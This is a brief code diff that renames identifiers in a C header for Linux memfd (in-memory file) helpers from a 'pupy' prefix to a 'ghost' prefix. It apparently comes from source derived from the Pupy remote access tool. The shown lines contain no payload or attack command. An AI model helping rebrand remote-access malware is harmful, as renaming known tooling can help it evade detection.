@@ -1,5 +1,5 @@
-#ifndef _PUPY_MEMFD_H
-#define _PUPY_MEMFD_H
+#ifndef _GHOST_MEMFD_H
+#define _GHOST_MEMFD_H
 
 #define _GNU_SOURCE
 #include <sys/syscall.h>
@@ -38,7 +38,7 @@
 static bool memfd_checked = false;
 static bool memfd_works = true;
 
-inline static bool pupy_memfd_supported()
+inline static bool ghost_memfd_supported()
 {
   int fd;
 
@@ -51,7 +51,7 @@ inline static bool pupy_memfd_supported()
   return fd != -1;
 }
 
-inline static int pupy_memfd_create(char *path, unsigned int path_size)
+inline static int ghost_memfd_create(char *path, unsigned int path_size)
 {
 #ifdef Linux
 
